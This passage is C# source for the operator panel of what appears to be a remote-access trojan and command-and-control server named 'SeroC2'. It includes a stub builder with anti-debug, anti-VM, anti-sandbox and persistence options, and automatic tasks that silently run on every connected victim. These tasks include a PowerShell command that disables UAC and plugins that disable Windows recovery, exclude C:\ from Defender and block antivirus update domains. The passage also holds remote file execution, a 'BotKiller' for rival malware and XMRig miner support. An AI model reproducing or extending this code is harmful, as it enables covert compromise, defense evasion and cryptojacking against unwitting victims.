        using var p = System.Diagnostics.Process.Start(psi)!;
        var outTask = p.StandardOutput.ReadToEndAsync();
        var errTask = p.StandardError.ReadToEndAsync();
        await p.WaitForExitAsync();
        return (p.ExitCode, await outTask + await errTask);
    }



    private void BuildConfig_Click(object sender, RoutedEventArgs e)
    {
        int.TryParse(BldPort.Text, out int port);
        int.TryParse(BldReconnectDelay.Text, out int reconnect);
        if (port < 1 || port > 65535) port = 7777;

        // Determine assembly name
        string name = "RuntimeBroker";

        var configDict = new Dictionary<string, object>
        {
            { "host", GetPrimaryHost() },
            { "port", port },
            { "assemblyName", name },
            { "useMutex", BldUseMutex.IsChecked == true },
            { "antiDebug", BldAntiDebug.IsChecked == true },
            { "antiVM", BldAntiVM.IsChecked == true },
            { "antiDetect", BldAntiDetect.IsChecked == true },
            { "antiSandbox", BldAntiSandbox.IsChecked == true },
            { "persistRegistry", BldPersistRegistry.IsChecked == true },
            { "persistStartup", BldPersistStartup.IsChecked == true },
            { "reconnectDelayMs", reconnect > 0 ? reconnect : 5000 },
        };

        // Only add mutexName if "Use Mutex" is checked
        if (BldUseMutex.IsChecked == true)
        {
            configDict["mutexName"] = BldMutex.Text.Trim();
        }

        var dialog = new Microsoft.Win32.SaveFileDialog
        {
            Filter = "JSON Config (*.json)|*.json",
            FileName = "config.json",
            Title = "Export Client Config"
        };

        if (dialog.ShowDialog() == true)
        {
            var json = JsonSerializer.Serialize(configDict, new JsonSerializerOptions { WriteIndented = true });
            File.WriteAllText(dialog.FileName, json);
            Log($"[+] Builder: Config exported to {dialog.FileName}");
            SetStatus("Config exported.");
        }
    }

    // ── Settings ────────────────────────────────────

    private async void GetMyIP_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            TxtPortResult.Text = "Getting IP...";
            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(5) };
            var ip = (await http.GetStringAsync("https://api.ipify.org")).Trim();
            SettingsCheckIP.Text = ip;
            TxtPortResult.Text = $"Your public IP: {ip}";
            TxtPortResult.Foreground = (Brush)FindResource("DimBrush");
        }
        catch { TxtPortResult.Text = "Failed to get IP."; }
    }

    private async void CheckPort_Click(object sender, RoutedEventArgs e)
    {
        var ip = SettingsCheckIP.Text.Trim();
        if (!int.TryParse(SettingsCheckPort.Text.Trim(), out int port) || port < 1 || port > 65535)
        {
            TxtPortResult.Text = "Invalid port.";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
            return;
        }

        if (ip is "127.0.0.1" or "localhost" or "::1" or "0.0.0.0" or "")
        {
            TxtPortResult.Text = "Cannot check localhost.";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
            return;
        }

        TxtPortResult.Text = $"Checking {ip}:{port}...";
        TxtPortResult.Foreground = (Brush)FindResource("DimBrush");

        try
        {
            using var tcp = new System.Net.Sockets.TcpClient();
            var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
            await tcp.ConnectAsync(ip, port, cts.Token);

            TxtPortResult.Text = $"Port {port} is OPEN on {ip}";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0x1b, 0x8a, 0x2e));
        }
        catch (OperationCanceledException)
        {
            TxtPortResult.Text = $"Port {port} is CLOSED or unreachable on {ip} (timeout)";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
        }
        catch
        {
            TxtPortResult.Text = $"Port {port} is CLOSED on {ip} (connection refused)";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
        }
    }

    private void SettingsApplyMaxClients_Click(object sender, RoutedEventArgs e)
    {
        if (int.TryParse(SettingsMaxClients.Text, out int max) && max > 0)
        {
            if (_server != null)
                _server.MaxConnectedClients = max;
            Log($"[*] Max connected clients set to {max}.");
            SetStatus($"Settings applied (max clients: {max}).");
            SaveConfig();
        }
        else
        {
            Log("[!] Invalid max clients value.");
        }
    }

    private void SettingsApplyDiscordRPC_Click(object sender, RoutedEventArgs e)
    {
        if (SettingsDiscordRPC.IsChecked == true && _discordRpc == null && _server is { IsRunning: true })
        {
            try
            {
                _discordRpc = new Net.SeroDiscordRPC();
                _discordRpc.Start(() => _server?.ConnectedClients.Count ?? 0);
                Log("[*] Discord RPC enabled.");
                SaveConfig();
            }
            catch { }
        }
        else if (SettingsDiscordRPC.IsChecked == false && _discordRpc != null)
        {
            _discordRpc.Stop();
            _discordRpc = null;
            Log("[*] Discord RPC disabled. Restart Discord or wait a few seconds for it to clear.");
            SaveConfig();
        }
    }

    [System.Runtime.InteropServices.DllImport("user32.dll")]
    private static extern bool SetWindowDisplayAffinity(nint hwnd, uint affinity);

    private void SettingsBlockCapture_Changed(object sender, RoutedEventArgs e)
    {
        // WDA_EXCLUDEFROMCAPTURE (0x11) hides from OBS/screenshots/RDP on Win10 2004+.
        // Falls back to WDA_MONITOR (0x1) on older builds (content shows as black).
        uint affinity = SettingsBlockCapture.IsChecked == true ? 0x11u : 0x0u;
        var hwnd = new System.Windows.Interop.WindowInteropHelper(this).Handle;
        if (!SetWindowDisplayAffinity(hwnd, affinity) && affinity != 0)
            SetWindowDisplayAffinity(hwnd, 0x1u);
        SaveConfig();
    }

    private void SettingsHideLogo_Changed(object sender, RoutedEventArgs e)
    {
        BgLogoImage.Visibility = SettingsHideLogo.IsChecked == true
            ? Visibility.Collapsed
            : Visibility.Visible;
        SaveConfig();
    }

    private void SettingsShowSeconds_Changed(object sender, RoutedEventArgs e)
    {
        UiPrefs.Set("ShowSeconds", SettingsShowSeconds.IsChecked == true ? 1 : 0);
        SaveConfig();
    }

    private void LoadSoundPreferences()
    {
        SndChk_Intro.IsChecked = UiPrefs.GetInt("SndEnabled_Intro", 1) == 1;
        SndChk_Startup.IsChecked = UiPrefs.GetInt("SndEnabled_Startup", 1) == 1;
        SndChk_Shutdown.IsChecked = UiPrefs.GetInt("SndEnabled_Shutdown", 1) == 1;
        SndChk_Connected.IsChecked = UiPrefs.GetInt("SndEnabled_Connected", 1) == 1;
        SndChk_NewClient.IsChecked = UiPrefs.GetInt("SndEnabled_NewClient", 1) == 1;
        SndChk_Disconnected.IsChecked = UiPrefs.GetInt("SndEnabled_Disconnected", 1) == 1;
        SndChk_BuildSuccess.IsChecked = UiPrefs.GetInt("SndEnabled_BuildSuccess", 1) == 1;
        SndChk_BuildError.IsChecked = UiPrefs.GetInt("SndEnabled_BuildError", 1) == 1;
        SndChk_Clipper.IsChecked = UiPrefs.GetInt("SndEnabled_Clipper", 1) == 1;
        SndChk_Keylogger.IsChecked = UiPrefs.GetInt("SndEnabled_Keylogger", 1) == 1;
        SndChk_AutoTask.IsChecked = UiPrefs.GetInt("SndEnabled_AutoTask", 1) == 1;
        SndChk_Download.IsChecked = UiPrefs.GetInt("SndEnabled_Download", 1) == 1;
        SndChk_Upload.IsChecked = UiPrefs.GetInt("SndEnabled_Upload", 1) == 1;
        SndChk_FileDelete.IsChecked = UiPrefs.GetInt("SndEnabled_FileDelete", 1) == 1;
    }

    private void SoundSetting_Changed(object sender, RoutedEventArgs e)
    {
        if (sender is System.Windows.Controls.CheckBox chk)
        {
            string name = chk.Name;
            if (name.StartsWith("SndChk_"))
            {
                string key = name.Substring(7);
                UiPrefs.Set("SndEnabled_" + key, chk.IsChecked == true ? 1 : 0);
            }
        }
    }

    private void PreviewSound_Click(object sender, RoutedEventArgs e)
    {
        if (sender is System.Windows.Controls.Button btn && btn.Tag is string fileName)
        {
            NotificationService.PlayPreviewFile(fileName);
        }
    }

    private void SettingsNotifySound_Changed(object sender, RoutedEventArgs e)
    {
        NotificationService.SetEnabled(SettingsNotifySound.IsChecked == true);
        SaveConfig();
    }

    private void ClearLogs_Click(object sender, RoutedEventArgs e)
    {
        if (TxtLogs == null) return;
        TxtLogs.Document.Blocks.Clear();
        _logPara = null;
        _logLineCount = 0;
        Log("[*] Logs cleared.");
    }

    private void SettingsDevLogs_Changed(object sender, RoutedEventArgs e)
    {
        bool on = SettingsDevLogs.IsChecked == true;
        DiagnosticLogger.Enabled = on;
        if (on) DiagnosticLogger.Info("Diagnostic logging re-enabled by user.");
        SaveConfig();
    }

    private void OpenDiagLogsFolder_Click(object sender, RoutedEventArgs e)
    {
        try { System.Diagnostics.Process.Start("explorer.exe", DiagnosticLogger.LogDirectory); }
        catch { }
    }

    // ── AutoTask ────────────────────────────────────

    private static bool ConfirmAutoTask(string action, string detail)
    {
        var result = MessageBox.Show(
            $"You are about to add the following AutoTask:\n\n" +
            $"  {action}\n\n" +
            $"{detail}\n\n" +
            "This will execute on all current and future clients (once per HWID).\n" +
            "Are you sure you want to continue?",
            "Confirm AutoTask",
            MessageBoxButton.YesNo,
            MessageBoxImage.Warning);
        return result == MessageBoxResult.Yes;
    }

    private void AutoTask_AddFile_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog
        {
            Title = "Select file to auto-execute on clients",
            Filter = "All files (*.*)|*.*|Executables (*.exe)|*.exe"
        };
        if (dlg.ShowDialog() != true) return;

        var fileName = Path.GetFileName(dlg.FileName);
        if (!ConfirmAutoTask($"Add File: {fileName}",
            "The file will be uploaded to the server and silently executed on every new client."))
            return;

        var fileBytes = File.ReadAllBytes(dlg.FileName);
        var entry = new Data.AutoTaskEntry
        {
            FileName = fileName,
            FileBase64 = Convert.ToBase64String(fileBytes),
            FileSize = fileBytes.Length
        };
        _autoTasks.Add(entry);
        Log($"[+] AutoTask: added {entry.FileName} ({entry.SizeDisplay})");
        _ = ExecuteAutoTasksForAllConnected();
    }

    private void AutoTask_BlockReset_Click(object sender, RoutedEventArgs e)
    {
        const string displayName = "Block Reset";
        if (_autoTasks.Any(t => t.FileName == displayName)) { Log("[!] AutoTask: Block Reset already in list."); return; }
        if (!ConfirmAutoTask("Block Reset",
            "Disables Windows Recovery Environment (WinRE) via reagentc /disable.\nPrevents the user from resetting or booting into recovery mode."))
            return;
        _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.BlockReset, "user32.lib", adminOnly: true);
    }

    private void AutoTask_ExcludeCDrive_Click(object sender, RoutedEventArgs e)
    {
        const string displayName = "Exclude C:\\";
        if (_autoTasks.Any(t => t.FileName == displayName)) { Log("[!] AutoTask: Exclude C:\\ already in list."); return; }
        if (!ConfirmAutoTask("Exclude C:\\",
            "Adds C:\\ to Windows Defender's exclusion list via WMI (SYSTEM/Admin required).\nDefender will no longer scan files on the C drive."))
            return;
        _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.ExcludeDefender, "ole32.lib oleaut32.lib advapi32.lib", adminOnly: true);
    }

    private void AutoTask_Custom_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new CustomAutoTaskDialog { Owner = this };
        if (dlg.ShowDialog() != true) return;

        if (!ConfirmAutoTask($"Custom: {dlg.TaskName}",
            $"Command: {dlg.TaskCommand}\n\nThis command will be executed silently on every new client."))
            return;

        var entry = new Data.AutoTaskEntry
        {
            Type = Data.AutoTaskType.ShellCommand,
            FileName = dlg.TaskName,
            ShellCommand = dlg.TaskCommand
        };
        _autoTasks.Add(entry);
        Log($"[+] AutoTask: custom task '{entry.FileName}' added.");
        _ = ExecuteAutoTasksForAllConnected();
    }

    private static string PluginCachePath(string pluginName)
    {
        var safe = pluginName.ToLowerInvariant()
            .Replace(" ", "_").Replace("\\", "").Replace(":", "").Replace("/", "_");
        return System.IO.Path.Combine(
            AppDomain.CurrentDomain.BaseDirectory, "plugin_cache", safe + ".dll");
    }

    // SHA256 of the C++ source — detects when plugin code changes after server recompile.
    private static string _SourceHash(string src)
    {
        var hash = System.Security.Cryptography.SHA256.HashData(
            System.Text.Encoding.UTF8.GetBytes(src));
        return Convert.ToHexString(hash)[..16]; // 16-char prefix is enough for cache key
    }

    private async Task CompileAndAddPluginTask(string taskName, string cppSource, string? extraLibs, bool adminOnly = false)
    {
        var cachePath = PluginCachePath(taskName);
        var hashPath  = cachePath + ".hash";
        byte[]? bytes = null;

        // Use cache only if the source hash matches — recompiles automatically when
        // plugin code changes (e.g. after a server recompile with updated sources).
        var currentHash = _SourceHash(cppSource);
        bool cacheValid = File.Exists(cachePath)
                       && File.Exists(hashPath)
                       && (await File.ReadAllTextAsync(hashPath)).Trim() == currentHash;

        if (cacheValid)
        {
            bytes = await File.ReadAllBytesAsync(cachePath);
            Log($"[*] AutoTask: {taskName} loaded from cache ({bytes.Length / 1024.0:F0} KB).");
        }
        else
        {
            if (File.Exists(cachePath))
                Log($"[*] AutoTask: {taskName} source changed — recompiling...");
            else
                Log($"[*] AutoTask: Compiling {taskName} plugin...");

            // Thread-safe log: CompilePluginDllAsync runs on the thread pool (to avoid blocking
            // the UI thread in GetVsEnvironment/FindClExe), so we marshal log calls back to UI.
            Action<string> safeLog = msg => Dispatcher.BeginInvoke(() => Log(msg));
            bytes = await Task.Run(() => Builder.CrypterBuilder.CompilePluginDllAsync(cppSource, extraLibs, safeLog));
            if (bytes == null)
            {
                Log($"[!] AutoTask: {taskName} compile failed — task not added.");
                return;
            }
            try
            {
                Directory.CreateDirectory(System.IO.Path.GetDirectoryName(cachePath)!);
                await File.WriteAllBytesAsync(cachePath, bytes);
                await File.WriteAllTextAsync(hashPath, currentHash);
            }
            catch { }
        }

        var entry = new Data.AutoTaskEntry
        {
            Type = Data.AutoTaskType.PluginExec,
            FileName = taskName,
            FileBase64 = Convert.ToBase64String(bytes),
            FileSize = bytes.Length,
            AdminOnly = adminOnly
        };
        _autoTasks.Add(entry);
        Log($"[+] AutoTask: {taskName} added as DLL plugin ({entry.SizeDisplay}).");
        _ = ExecuteAutoTasksForAllConnected();
    }

    private void AutoTask_DisableUAC_Click(object sender, RoutedEventArgs e)
    {
        if (_autoTasks.Any(t => t.FileName == "Disable UAC")) { Log("[!] AutoTask: Disable UAC already in list."); return; }
        if (!ConfirmAutoTask("Disable UAC",
            "Sets EnableLUA=0 and disables all UAC prompts via registry (Admin required).\nTakes effect after the client reboots — future processes run elevated without any UAC popup."))
            return;

        var entry = new Data.AutoTaskEntry
        {
            Type = Data.AutoTaskType.ShellCommand,
            FileName = "Disable UAC",
            ShellCommand = "powershell -NoP -NonI -W Hidden -Command \"" +
                "$p='HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System';" +
                "Set-ItemProperty $p EnableLUA                   0 -Type DWord -Force;" +
                "Set-ItemProperty $p ConsentPromptBehaviorAdmin  0 -Type DWord -Force;" +
                "Set-ItemProperty $p ConsentPromptBehaviorUser   0 -Type DWord -Force;" +
                "Set-ItemProperty $p PromptOnSecureDesktop       0 -Type DWord -Force\"",
            AdminOnly = true
        };
        _autoTasks.Add(entry);
        Log("[+] AutoTask: Disable UAC added (EnableLUA=0, no reboot forced).");
        _ = ExecuteAutoTasksForAllConnected();
    }


    private void AutoTask_BlockAvDomains_Click(object sender, RoutedEventArgs e)
    {
        const string displayName = "Block AV DNS";
        if (_autoTasks.Any(t => t.FileName == displayName)) { Log("[!] AutoTask: Block AV DNS already in list."); return; }
        if (!ConfirmAutoTask("Block AV DNS",
            "Blocks update/telemetry domains of common AV products (Defender, Kaspersky, ESET, Bitdefender…) via the hosts file.\nPrevents antivirus signature updates and cloud lookups."))
            return;
        _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.BlockAvDns, "user32.lib", adminOnly: true);
    }

    private void AutoTask_BotKiller_Click(object sender, RoutedEventArgs e)
    {
        const string displayName = "BotKiller";
        if (_autoTasks.Any(t => t.FileName == displayName)) { Log("[!] AutoTask: BotKiller already in list."); return; }
        if (!ConfirmAutoTask("BotKiller",
            "Scans for and terminates unsigned processes with random-looking names (common RAT/miner pattern).\nAlso removes their persistence from Run registry keys and the Startup folder."))
            return;
        _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.BotKiller, "advapi32.lib", adminOnly: false);
    }

    private async void BldMnrDownloadXmrig_Click(object sender, RoutedEventArgs e)
    {
        string fallback = "https://github.com/xmrig/xmrig/releases/latest";
        string url = fallback;
        try
        {
            using var http = new System.Net.Http.HttpClient();
            http.DefaultRequestHeaders.Add("User-Agent", "SeroC2-Builder");
            http.Timeout = TimeSpan.FromSeconds(6);
            var json = await http.GetStringAsync("https://api.github.com/repos/xmrig/xmrig/releases/latest");
            using var doc = System.Text.Json.JsonDocument.Parse(json);
            if (doc.RootElement.TryGetProperty("assets", out var assets))
            {
                foreach (var asset in assets.EnumerateArray())
                {
                    if (asset.TryGetProperty("name", out var nameProp) &&
                        nameProp.GetString() is string n &&
                        n.Contains("windows-x64", StringComparison.OrdinalIgnoreCase) && n.EndsWith(".zip") &&
                        asset.TryGetProperty("browser_download_url", out var dlProp) &&
                        dlProp.GetString() is string dl)
                    {
                        url = dl;
                        break;
                    }
                }
            }
        }
        catch { }
        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo { FileName = url, UseShellExecute = true });
    }

    private void BldMnrStatsLaunch_Click(object sender, RoutedEventArgs e)
    {
        var localIp = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()
            .Where(ni => ni.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up)
            .SelectMany(ni => ni.GetIPProperties().UnicastAddresses)
            .Where(a => a.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork
                     && !System.Net.IPAddress.IsLoopback(a.Address)
                     && a.Address.GetAddressBytes()[0] != 169)
            .Select(a => a.Address.ToString())
            .FirstOrDefault() ?? "localhost";
        BldMnrStatsUrl.Text = $"http://{localIp}:8080/api/report";

        bool alreadyRunning = System.Diagnostics.Process.GetProcessesByName("StatsServer").Length > 0;
        if (!alreadyRunning)
        {
            var exeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
            // Walk up until we find the project root (contains stats-server/)
            string? projectRoot = null;
            var dir = new DirectoryInfo(exeDir);
            while (dir != null)
            {
                if (Directory.Exists(Path.Combine(dir.FullName, "stats-server")))
                { projectRoot = dir.FullName; break; }
                dir = dir.Parent;
            }

            string? exe = null;
            if (projectRoot != null)
            {
                var candidates = new[]
                {
                    Path.Combine(projectRoot, "stats-server", "publish", "StatsServer.exe"),
                    Path.Combine(projectRoot, "stats-server", "bin", "Release", "net10.0-windows", "win-x64", "StatsServer.exe"),
                    Path.Combine(projectRoot, "stats-server", "bin", "Release", "net10.0-windows", "StatsServer.exe"),
                };
                exe = candidates.FirstOrDefault(File.Exists);
                // Fallback: recursive search under stats-server/
                if (exe == null)
                {
                    var ssDir = Path.Combine(projectRoot, "stats-server");
                    exe = Directory.GetFiles(ssDir, "StatsServer.exe", SearchOption.AllDirectories)
                                   .OrderByDescending(File.GetLastWriteTime)
                                   .FirstOrDefault();
                }
            }

            if (exe == null) { Log("[!] StatsServer.exe not found — build it first or run start_stats.bat"); }
            else
            {
                var token = BldMnrStatsToken.Text.Trim();
                var psi = new System.Diagnostics.ProcessStartInfo(exe) { UseShellExecute = true };
                psi.Arguments = string.IsNullOrEmpty(token) ? "8080" : $"8080 {token}";
                try { System.Diagnostics.Process.Start(psi); Log($"[+] StatsServer launched: {Path.GetFileName(exe)}"); }
                catch (Exception ex) { Log($"[!] Cannot launch stats-server: {ex.Message}"); }
            }
        }
        else { Log("[*] StatsServer already running."); }

        var dashUrl = $"http://{localIp}:8080/";
        try { System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(dashUrl) { UseShellExecute = true }); }
        catch { }
    }

    // ── BotKiller: send to selected clients on-demand (right-click menu) ──
    private async void BotKiller_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var bytes = await Builder.CrypterBuilder.CompilePluginDllAsync(
            Builder.PluginSources.BotKiller, "advapi32.lib", Log);
        if (bytes == null) { Log("[!] BotKiller: compile failed."); return; }

        var packet = new Protocol.Packet
        {
            Type = Protocol.PacketType.PluginExec,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
            {
                DllBase64  = Convert.ToBase64String(bytes),
                ExportName = "PluginMain"
            })
        };
        foreach (var c in clients)
            await _server.SendToClient(c.Id, packet);
        Log($"[+] BotKiller sent to {clients.Count} client(s) ({bytes.Length / 1024.0:F0} KB).");
    }

    private void AutoTask_Remove_Click(object sender, RoutedEventArgs e)
    {
        var selected = GridAutoTasks.SelectedItems.Cast<Data.AutoTaskEntry>().ToList();
        if (selected.Count == 0) return;
        string msg = selected.Count == 1
            ? $"Remove auto-task '{selected[0].FileName}'?\nThis cannot be undone."
            : $"Remove {selected.Count} auto-tasks?\nThis cannot be undone.";
        if (MessageBox.Show(msg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        foreach (var task in selected)
        {
            _autoTasks.Remove(task);
            Log($"[-] AutoTask: removed {task.FileName}");
        }
    }

    private void AutoTask_Refresh_Click(object sender, RoutedEventArgs e)
    {
        LoadConfig();
        SetStatus("AutoTasks reloaded from config.");
    }

    private async Task ExecuteAutoTasksForAllConnected()
    {
        if (_server == null || _autoTasks.Count == 0) return;
        foreach (var client in _server.ConnectedClients.Values.ToList())
        {
            try
            {
                await ExecuteAutoTasksForClient(client);
                await Task.Delay(200); // Space out between clients
            }
            catch { }
        }
    }

    public async Task ExecuteAutoTasksForClient(Data.ConnectedClient client)
    {
        var executedNames = new System.Collections.Generic.List<string>();

        foreach (var task in _autoTasks.ToList())
        {
            // Atomic check+add: lock prevents race between ExecuteAutoTasksForAllConnected
            // (UI thread) and ClientConnected Task.Run (thread pool) both seeing Contains=false
            // and both executing the same task → double-counting.
            bool alreadyDone;
            lock (task.ExecutedHwids)
                alreadyDone = !task.ExecutedHwids.Add(client.Hwid);
            if (alreadyDone) continue;

            // Skip admin-only tasks for non-admin clients
            if (task.AdminOnly && !client.IsAdmin)
            {
                lock (task.ExecutedHwids) task.ExecutedHwids.Remove(client.Hwid);
                continue;
            }

            try
            {
                Protocol.Packet packet;

                if (task.Type == Data.AutoTaskType.DefenderExclude)
                {
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.DefenderExclude,
                        Data = task.ShellCommand  // empty = stub uses its own install dir
                    };
                }
                else if (task.Type == Data.AutoTaskType.ShellCommand)
                {
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.AutoTaskShell,
                        Data = task.ShellCommand
                    };
                }
                else if (task.Type == Data.AutoTaskType.PluginExec)
                {
                    var data = new Protocol.PluginExecData
                    {
                        DllBase64  = task.FileBase64,
                        ExportName = "PluginMain"
                    };
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.PluginExec,
                        Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
                    };
                }
                else
                {
                    var data = new Protocol.RemoteFileExecData
                    {
                        FileName = task.FileName,
                        FileBase64 = task.FileBase64
                    };
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.RemoteFileExec,
                        Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
                    };
                }

                if (client.Stream == null) continue;
                if (!await client.WriteLock.WaitAsync(TimeSpan.FromSeconds(8))) continue;
                if (client.Stream == null) { client.WriteLock.Release(); continue; }
                try { await Protocol.Packet.WriteToStreamAsync(client.Stream, packet); }
                catch { lock (task.ExecutedHwids) task.ExecutedHwids.Remove(client.Hwid); throw; }
                finally { client.WriteLock.Release(); }
                Interlocked.Increment(ref task.ExecutionCountField);
                NotificationService.NotifyAutoTaskDone();
                executedNames.Add(task.FileName);
                // All Dispatcher calls are thread-safe — ExecuteAutoTasksForClient may run
                // from Task.Run (ClientConnected) or UI thread (ExecuteAutoTasksForAllConnected).
                _ = Dispatcher.BeginInvoke(() =>
                {
                    task.NotifyExecutionCount();
                    _autoTasksDirty = true;
                });

                await Task.Delay(100);
            }
            catch (Exception ex)
            {
                // Suppress noise when client already disconnected — ObjectDisposedException
                // and IOException both mean the socket closed (already logged as disconnect).
                if (client.Stream == null || ex is ObjectDisposedException || ex is System.IO.IOException) continue;
                var msg = ex.Message.Replace("\r\n", " ").Replace("\n", " ");
                _ = Dispatcher.BeginInvoke(() =>
                    Log($"[!] AutoTask: failed {task.FileName} on {client.Id}: {msg}"));
            }
        }

        // Single batch line instead of one per task
        if (executedNames.Count > 0)
        {
            var names = string.Join(", ", executedNames);
            _ = Dispatcher.BeginInvoke(() =>
                Log($"[+] AutoTask: {client.Id} ← {names}"));
        }
    }

    // ── Cert Setup / Export ─────────────────────────

    /// <summary>
    /// Shown on first launch — lets the user generate+save OR import an existing cert.
    /// </summary>
    private void ShowCertSetupDialog()
    {
        var dlg = new Window
        {
            Title = "Sero — TLS Certificate Setup",
            Width = 420, Height = 200,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            ResizeMode = ResizeMode.NoResize,
            Background = new SolidColorBrush(Color.FromRgb(24, 24, 24)),
            WindowStyle = WindowStyle.ToolWindow,
        };

        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(20) };

        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = "No TLS certificate found. Choose an option:",
            Foreground = Brushes.White,
            FontSize = 13,
            Margin = new Thickness(0, 0, 0, 16),
            TextWrapping = TextWrapping.Wrap,
        });

        var btnImport = new System.Windows.Controls.Button
        {
            Content = "Import backup or certificate (.sero / .pfx)…",
            Margin = new Thickness(0, 0, 0, 8),
            Padding = new Thickness(10, 6, 10, 6),
            HorizontalAlignment = HorizontalAlignment.Stretch,
        };
        var btnGen = new System.Windows.Controls.Button
        {
            Content = "Generate new certificate and save it…",
            Padding = new Thickness(10, 6, 10, 6),
            HorizontalAlignment = HorizontalAlignment.Stretch,
        };

        btnImport.Click += (_, _) => ImportCertOrBackup(() => dlg.Close());

        btnGen.Click += (_, _) =>
        {
            dlg.Close();
            var save = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "PFX Certificate (*.pfx)|*.pfx",
                FileName = "sero_cert.pfx",
                Title = "Choose where to save the certificate"
            };
            if (save.ShowDialog() != true) return;
            try
            {
                Net.CertificateHelper.GenerateAndExportTo(save.FileName);
                Log($"[+] Certificate generated and saved to {save.FileName}");
                try { BldCertHash.Text = Net.CertificateHelper.GetCertSha256Hash(); } catch { }
                MessageBox.Show(
                    $"Certificat sauvegardé :\n{save.FileName}\n\nAucun mot de passe requis pour l'importer.",
                    "Sero — Certificat prêt", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex) { Log($"[!] Cert generation failed: {ex.Message}"); }
        };

        sp.Children.Add(btnImport);
        sp.Children.Add(btnGen);
        dlg.Content = sp;
        dlg.ShowDialog();
    }

    private void ExportBackup_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            var authKey = BldAuthKey.Text.Trim();
            if (string.IsNullOrEmpty(authKey))
            {
                MessageBox.Show("Generate or set an auth key in the Builder tab before exporting a backup.",
                    "Sero — No Auth Key", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            var dialog = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "Sero Backup (*.sero)|*.sero",
                FileName = "sero_backup.sero",
                Title = "Export Server Backup (cert + auth key)"
            };
            if (dialog.ShowDialog() != true) return;

            CertificateHelper.ExportServerBackup(dialog.FileName, authKey);
            Log($"[+] Server backup exported to {dialog.FileName}");
            SetStatus("Server backup exported.");
            MessageBox.Show(
                $"Backup exporté :\n{dialog.FileName}\n\nContient le certificat TLS et la clé d'auth.\nImportez ce fichier sur une autre machine pour que les clients reconnectent.",
                "Sero — Backup réussi", MessageBoxButton.OK, MessageBoxImage.Information);
        }
        catch (Exception ex)
        {
            Log($"[!] Backup export failed: {ex.Message}");
            MessageBox.Show($"Export failed: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

    private void ImportBackup_Click(object sender, RoutedEventArgs e)
        => ImportCertOrBackup(null);

    private void ImportCertOrBackup(Action? onSuccess)
    {
        var open = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Sero Backup or Certificate (*.sero;*.pfx)|*.sero;*.pfx|All Files (*.*)|*.*",
            Title = "Import server backup (.sero) or certificate (.pfx)"
        };
        if (open.ShowDialog() != true) return;

        try
        {
            var path = open.FileName;
            var ext = System.IO.Path.GetExtension(path).ToLowerInvariant();

            if (ext == ".sero")
            {
                var restoredKey = CertificateHelper.ImportServerBackup(path);
                try { BldCertHash.Text = CertificateHelper.GetCertSha256Hash(); } catch { }

                if (!string.IsNullOrEmpty(restoredKey))
                {
                    BldAuthKey.Text = restoredKey;
                    BldAuthKey.IsReadOnly = true;
                    SaveConfig();
                }
                Log("[+] Server backup restored (cert + auth key).");
                SetStatus("Backup restored.");
                MessageBox.Show(
                    "Backup restauré.\nCertificat + clé d'auth restaurés.\nRedémarrez le serveur pour que les clients reconnectent.",
                    "Sero — Import réussi", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            else
            {
                try { CertificateHelper.ImportCertificate(path, null); }
                catch
                {
                    var pwd = PromptPassword("Ce certificat est protégé par un mot de passe.\nEntrez le mot de passe PFX :");
                    if (pwd == null) return;
                    CertificateHelper.ImportCertificate(path, pwd);
                }
                try { BldCertHash.Text = CertificateHelper.GetCertSha256Hash(); } catch { }
                Log("[+] Certificate imported.");
                SetStatus("Certificate imported.");
                MessageBox.Show(
                    "Certificat importé.\nATTENTION : la clé d'auth n'est pas incluse dans un .pfx.\nVérifiez que la clé d'auth dans le Builder correspond à celle de vos stubs.",
                    "Sero — Import cert", MessageBoxButton.OK, MessageBoxImage.Warning);
            }

            onSuccess?.Invoke();
        }
        catch (Exception ex)
        {
            Log($"[!] Import failed: {ex.Message}");
